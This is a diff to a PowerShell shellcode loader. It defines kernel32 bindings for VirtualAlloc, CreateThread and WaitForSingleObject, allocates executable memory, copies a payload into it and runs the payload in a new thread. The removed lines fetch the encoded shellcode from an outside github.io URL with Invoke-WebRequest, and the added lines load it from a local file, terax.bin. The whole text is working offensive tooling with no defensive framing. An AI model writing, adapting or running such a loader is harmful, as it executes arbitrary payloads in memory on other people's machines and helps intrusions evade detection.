@@ -4,12 +4,12 @@ $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflectio
 $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Module', $False)
 $TypeBuilder = $ModuleBuilder.DefineType('Win32', 'Public, Class')
 
-$PInvokeMethod = $TypeBuilder.DefineMethod('VirtualAlloc',
+$PInvokeMethod = $TypeBuilder.DefineMethod('VirtualAlloc', 
     [System.Reflection.MethodAttributes] 'Public, Static',
     [IntPtr],
     [Type[]] @([IntPtr], [UInt32], [UInt32], [UInt32]))
 $DllImportConstructor = [System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
-$FieldArray = [System.Runtime.InteropServices.FieldInfo[]] @([System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'))
+$FieldArray = [System.Reflection.FieldInfo[]] @([System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'))
 $FieldValueArray = [Object[]] @($True)
 $CustomBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('kernel32.dll'), $FieldArray, $FieldValueArray)
 $PInvokeMethod.SetCustomAttribute($CustomBuilder)
@@ -19,7 +19,7 @@ $PInvokeMethod = $TypeBuilder.DefineMethod('CreateThread',
     [IntPtr],
     [Type[]] @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]))
 $DllImportConstructor = [System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
-$FieldArray = [System.Runtime.InteropServices.FieldInfo[]] @([System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'))
+$FieldArray = [System.Reflection.FieldInfo[]] @([System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'))
 $FieldValueArray = [Object[]] @($True)
 $CustomBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('kernel32.dll'), $FieldArray, $FieldValueArray)
 $PInvokeMethod.SetCustomAttribute($CustomBuilder)
@@ -29,23 +29,18 @@ $PInvokeMethod = $TypeBuilder.DefineMethod('WaitForSingleObject',
     [UInt32],
     [Type[]] @([IntPtr], [UInt32]))
 $DllImportConstructor = [System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]))
-$FieldArray = [System.Runtime.InteropServices.FieldInfo[]] @([System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'))
+$FieldArray = [System.Reflection.FieldInfo[]] @([System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError'))
 $FieldValueArray = [Object[]] @($True)
 $CustomBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($DllImportConstructor, @('kernel32.dll'), $FieldArray, $FieldValueArray)
 $PInvokeMethod.SetCustomAttribute($CustomBuilder)
 
 $Win32 = $TypeBuilder.CreateType()
 
-# --- Modified Section ---
-$shellcodeUrl = "https://th3hunt3y.github.io/inject.bin.sgn" # Replace with the actual URL to your shellcode
-$response = Invoke-WebRequest -Uri $shellcodeUrl -UseBasicParsing
-$shellcode = $response.Content | ForEach-Object { [byte]$_ } # Convert string content to bytes if necessary
-# --- End Modified Section ---
-
+$shellcode = [System.IO.File]::ReadAllBytes("terax.bin");
 $size = $shellcode.Length;
 
 [IntPtr]$addr = [Win32]::VirtualAlloc(0, $size, 0x3000, 0x40);
-
+	
 [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $size);
 
 $handle = [Win32]::CreateThread(0, 0, $addr, 0, 0, 0);
